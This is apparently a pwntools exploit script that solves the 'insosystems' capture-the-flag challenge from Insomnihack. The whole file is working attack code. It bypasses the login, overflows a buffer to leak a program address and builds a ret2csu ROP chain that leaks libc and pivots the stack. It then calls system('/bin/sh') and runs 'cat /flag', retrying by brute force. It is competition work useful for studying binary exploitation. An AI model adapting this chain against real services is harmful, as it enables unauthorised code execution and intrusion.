#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("insosystems")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

timing = 2
host, port = "insosystems.insomnihack.ch", 31337
if args.DOCKER:
  host, port= "127.0.0.1", 31337
  timing=2

count = 0
while (count<256):
  p = remote(host,port)

  p.send('|0||1|1|')	# bypass login
  p.send('|2|1|a|4100|')	# overflow to leak partial prog address on stack
  p.send(b'\x00'*4096+p32(4200)+'A'*52)
  p.recvuntil('A'*40,drop=True)
  leak = u64((p.recvuntil('|',drop=True)+b'\xba\x55').ljust(8,b'\x00'))		# complete the partial leak
  exe.address = leak-0x1c65
  # now we compose a rop
  logleak('trying prog base = ',exe.address)
  pop_rdi = exe.address + 0x0000000000001b63 # pop rdi ; ret
  pop_rbp = exe.address + 0x0000000000000d30 # pop rbp ; ret
  leave = exe.address + 0x0000000000000e5d # leave ; ret
  set_csu = exe.address + 0x1b5a
  call_csu = exe.address + 0x1b40

  def csucall(func,arg1,arg2,arg3):
    return p64(set_csu)+p64(0)+p64(1)+p64(func)+p64(arg1)+p64(arg2)+p64(arg3)+p64(call_csu)+p64(0)*7
  ret = exe.address+0x0000000000000b3e # ret
  bss = exe.bss(0xa00)
  payload2 = csucall(exe.got['write'], 1,exe.got['printf'],8)		# leak printf got address
  payload2 += csucall(exe.got['read'], 0,bss, 100)			# read next rop on .bss
  payload2 += p64(pop_rbp)+p64(bss-8)+p64(leave)			# pivot to .bss

  p.send('|2|1|a|'+str(0x1078+len(payload2))+'|')
  p.send(b'\x00'*1000)
  p.send(b'\x00'*1000)
  p.send(b'\x00'*1000)
  p.send(b'\x00'*1000)
  p.send_raw(b'B'*96+p32(0x1078-0x64))
#  pause()
  sleep(timing)
  p.send(payload2)
  p.recvuntil('\n',drop=True)
  try:
    p.recvuntil(b'\x31\x7c\x0a', drop=True, timeout=2)
#    context.log_level = 'debug'
    libc.address = u64(p.recv(8), timeout=3)-0x64e40
    logbase()
    # send second rop, system('/bin/sh')
    rop2 = ROP(libc)
    rop2.call(libc.symbols['system'],[next(libc.search('/bin/sh'))])
    p.send(rop2.chain())
    # try to exec id, and cat /flag
    p.sendline('id;cat /flag;')
    # if we receive back uid, out bruteforce worked
    buff =p.recvuntil('uid', timeout=4)
    print(buff)
    break
  except:
    # if it did not work, let's try again
    p.close()
    count +=1

p.interactive()

